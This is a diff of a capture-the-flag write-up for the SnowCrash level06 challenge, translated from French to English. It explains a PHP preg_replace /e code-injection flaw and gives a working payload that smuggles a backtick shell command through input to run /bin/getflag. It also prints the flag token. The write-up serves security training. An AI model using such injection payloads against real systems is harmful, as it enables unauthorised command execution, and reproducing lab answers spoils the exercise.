@@ -1,16 +1,19 @@
 # level06
 
-1. Fichiers trouvés dans `~/` :
+1. Files found in `~/` :
 
 ```bash
 level06  level06.php
+```
+
+```bash
 level06@SnowCrash:~$ strings level06 | grep level06
 /home/user/level06/level06.php
 ```
 
-2) Analyse du fichier `level06.php`
+2. Analysis of the `level06.php` file
 
-Le binaire `level06` peut executer du code php via l'expand (option `e`) de `preg_replace`.
+The `level06` binary can execute php code via the expand (option `e`) of `preg_replace`.
 
 ```php
 function y($m) { $m = preg_replace(.,  x , $m); $m = preg_replace(@,  y, $m); return $m; }
@@ -23,18 +26,21 @@ function x($y, $z) {
   return $a; 
 }
 $r = x($argv[1], $argv[2]); print $r;
-
 ```
-3) Exploitation pour récupérer le token :
 
-* On crée une chaine pour `preg_replace` :```echo '[x ${`/bin/getflag`}]'```
+3. Exploitation
 
-On l'exécute :
+Create a string for `preg_replace` :
+
+```bash
+echo '[x ${`/bin/getflag`}]' | ./level06 php://stdin 2>&1 | grep token
+```
+
 ```bash
 level06@SnowCrash:~$ echo '[x ${`/bin/getflag`}]' | ./level06 php://stdin 2>&1 | grep token
-PHP Notice:  Undefined variable: Check flag.Here is your token : ...
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 ```
 
-4) Token découvert :
+4. Token discovered
 
-Le token est `wiok45aaoguiboiki2tuin6ub`.
+The token is : `wiok45aaoguiboiki2tuin6ub`
